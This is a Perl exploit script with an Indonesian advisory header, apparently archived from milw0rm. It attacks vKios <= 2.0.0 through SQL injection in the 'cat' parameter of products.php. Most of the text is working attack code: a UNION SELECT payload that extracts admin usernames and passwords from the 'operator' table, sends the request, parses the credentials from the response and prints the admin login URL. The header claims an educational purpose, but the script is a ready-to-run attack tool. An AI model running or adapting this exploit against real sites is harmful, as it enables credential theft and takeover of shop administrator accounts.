@@ -1,0 +1,70 @@
+#!/usr/bin/perl
+#
+# Indonesian Newhack Security Advisory
+# ------------------------------------
+# vKios <= 2.0.0  (products.php cat) Remote SQL Injection Exploit
+# Waktu		:  Feb 8 2008 10:00PM
+# Software	:  vKios  
+# Versi		:  <= 2.0.0
+# Vendor 	:  http://www.vkios.com/
+#
+# ------------------------------------
+# Audit Oleh 	:  NTOS-Team
+# Lokasi	:  Indonesia | http://newhack.org
+# Penjelasan	:
+# 
+# vKios adalah aplikasi CMS untuk membangun website toko online dalam sekejap
+# variabel "cat" pada berkas "products.php" tidak tersaring dengan sempurna
+# sehingga pengunjung site dapat memanipulasi pernyataan SQL melalui URL secara Remote
+# Contoh ;
+# http://site.korban/products.php?cat=[SQLI]   
+#
+# -------------------------------------
+# Exploit ini dibuat untuk pembelajaran, pengetesan dan pembuktian dari apa yang kami pelajari,
+# Indonesian Newhack Technology tidak bertanggung jawab akan kerusakan 
+# yang diakibatkan dari penyalahgunaan exploit oleh pihak lain  
+#
+# => NTOS-Team->[fl3xu5,k1tk4t,opt1lc]
+# 
+use LWP::UserAgent;
+use Getopt::Long;
+
+if(!$ARGV[2])
+{
+ print "\n  |-------------------------------------------------------|";
+ print "\n  |            Indonesian Newhack Technology              |";
+ print "\n  |-------------------------------------------------------|";
+ print "\n  | vKios (products.php cat) Remote SQL Injection Exploit |";
+ print "\n  |                Coded by NTOS-Team                     |";
+ print "\n  |-------------------------------------------------------|";
+ print "\n[!] ";
+ print "\n[!] Penggunaan : perl vkios.pl [Site] [Path] [Option]";
+ print "\n[!] [Option] 2 = versi > 1.3  |  1 = versi < 1.3 ";
+ print "\n[!] Contoh     : perl vkios.pl localhost /vkios/ -o 1";
+ print "\n[!] ";
+ print "\n";
+ exit;
+}
+$site = $ARGV[0]; # Site Target
+$path = $ARGV[1]; # Path direktori vKios
+%options = ();
+GetOptions(\%options, "o=i",);
+if($options{"o"} && $options{"o"} == 1) { $injek = "http://".$site.$path."products.php?cat=-1%20union%20select%201,concat(0x74346d7520,username,0x3a,password,0x2067656c3470),3,4,5,6,7,8,9%20from%20operator"; }
+if($options{"o"} && $options{"o"} == 2) { $injek = "http://".$site.$path."products.php?cat=-1%20union%20select%201,concat(0x74346d7520,username,0x3a,password,0x2067656c3470),3,4,5,6,7,8,9,10%20from%20operator"; }
+
+$www = new LWP::UserAgent;
+$sql = $injek;
+print "\n\n [Konek] Injeksi SQL \n";
+$res = $www -> get($sql) or err();
+$res -> content() =~ /t4mu (.*?) gel4p/ or err();
+print "\n [Info.] username:password";
+print "\n [Hasil] $1 \n";
+print "\n [Login] http://".$site.$path."admin/ \n\n";
+
+sub err()
+{
+print "\n [-] Exploit gagal :( - cari yang lain!";
+exit();
+}
+
+# milw0rm.com [2008-02-12]
